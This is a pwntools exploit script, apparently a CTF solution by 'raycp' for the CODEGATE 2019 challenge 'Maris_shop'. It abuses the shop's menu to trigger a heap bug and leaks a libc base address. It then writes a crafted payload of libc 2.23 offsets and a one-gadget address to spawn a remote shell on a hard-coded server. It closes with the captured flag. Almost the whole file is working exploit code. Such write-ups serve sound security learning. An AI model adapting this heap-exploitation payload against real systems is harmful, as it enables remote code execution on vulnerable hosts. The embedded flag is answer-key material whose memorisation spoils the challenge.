## description: exp for maris_shop
## author: raycp
## data: 2019-02-01

from pwn import *


DEBUG = 0
if DEBUG:
     p = process('./Maris_shop')
     e = ELF('./Maris_shop')
     #context.log_level = 'debug'
     #libc=ELF('/lib/i386-linux-gnu/libc-2.23.so')
     libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
     #p = process(['./steak'], env={'LD_PRELOAD': os.path.join(os.getcwd(),'libc-2.23.so')})
     #libc = ELF('./libc-2.23.so')
     
     
else:
     #e = ELF('./steak')
     p = remote('110.10.147.102', 7767  )
     #p.interactive()
     libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
     #libc = ELF('libc_64.so.6')

wordSz = 4
hwordSz = 2
bits = 32
PIE = 0
mypid=0
def leak(address, size):
   with open('/proc/%s/mem' % mypid) as mem:
      mem.seek(address)
      return mem.read(size)

def findModuleBase(pid, mem):
   name = os.readlink('/proc/%s/exe' % pid)
   with open('/proc/%s/maps' % pid) as maps:
      for line in maps:
         if name in line:
            addr = int(line.split('-')[0], 16)
            mem.seek(addr)
            if mem.read(4) == "\x7fELF":
               bitFormat = u8(leak(addr + 4, 1))
               if bitFormat == 2:
                  global wordSz
                  global hwordSz
                  global bits
                  wordSz = 8
                  hwordSz = 4
                  bits = 64
               return addr
   log.failure("Module's base address not found.")
   sys.exit(1)

def debug(addr):
    global mypid
    mypid = proc.pidof(p)[0]
    #raw_input('debug:')
    
    with open('/proc/%s/mem' % mypid) as mem:
        moduleBase = findModuleBase(mypid, mem)
        print "program_base",hex(moduleBase)
        gdb.attach(p, "set follow-fork-mode child\nb *" + hex(moduleBase+addr))

def add(idx,amount):
    p.recvuntil('choice:')
    p.sendline('1')
    p.recvuntil('tem?:')
    p.sendline(str(idx))
    data=p.recv()
    #print data
    if 'Amount?:' in data:
        p.sendline(str(amount))
        return True
    else:
        p.sendline(str(amount))
        return False
    
def delete_all():
    p.recvuntil('choice:')
    p.sendline('4')
    p.recvuntil('choice:')
    p.sendline('2')
    p.recvuntil('choice:')
    p.sendline('1')

def delete_one(idx):
    p.recvuntil('choice:')
    p.sendline('4')
    p.recvuntil('choice:')
    p.sendline('1')
    p.recvuntil('item?:')
    p.sendline(str(idx))

def remove_one(idx):
    p.recvuntil('choice:')
    p.sendline('2')
    p.recvuntil('item?:')
    p.sendline(str(idx))

def show_one(idx):
    p.recvuntil('choice:')
    p.sendline('3')
    p.recvuntil('choice:')
    p.sendline('1')
    p.recvuntil('item?:')
    p.sendline(str(idx))

def add_one(name,amount):
    i=0
    while True:
        name_list=[]
        p.recvuntil('choice:')
        p.sendline('1')
        p.recvuntil('\n')
        for j in range(1,7):
            name_list.append(p.recvuntil('\n')[:-1])
            print name_list[j-1]
            if name in name_list[j-1]:
                i=j
        if i!=0:
            break
        else:
            p.recvuntil('item?:')
            p.sendline('7')
    p.recvuntil('item?:')
    p.sendline(str(i))
    p.recvuntil('more?:')
    p.sendline(str(amount))
    
         
def pwn():
    #debug(0xfad)
    for i in range(0,16):
        while True:
            if add(1,0):
                break
    remove_one(1)
    while True:
        if add(1,0):
            break
    delete_one(0)
    
    while True:
        if add(1,0):
            break

    delete_all()
    #debug(0x1ea9)
    show_one(15)
    p.recvuntil('Amount: ')
    libc_addr=int(p.recvuntil('\n')[:-1])
    libc_base=libc_addr-0x3c4b78
    rce=libc_base+0xf02a4
    print "libc base",hex(libc_base)
    show_one(15)
    p.recvuntil('Name: ')
    name=p.recvuntil('\n')[:-1]
    
    add_one(name,'-616')
    while True:
        if add(1,0):
            break
    data='\x00'*5+p64(libc_base+0x3c6790)+p64(0xffffffffffffffff)+p64(0x0000000000000000)+p64(libc_base+0x3c49c0)+p64(0)*3+p64(0x00000000ffffffff)+p64(0)*2+p64(libc_base+0x3c49c0)+p64(0)*2+p64(rce)*10
    p.sendline(data)
    p.interactive()
    
    
    

if __name__ == '__main__':
   pwn()

#CODEGATE{55f74e7a6fa3a979f71ccfaf27aa112a}

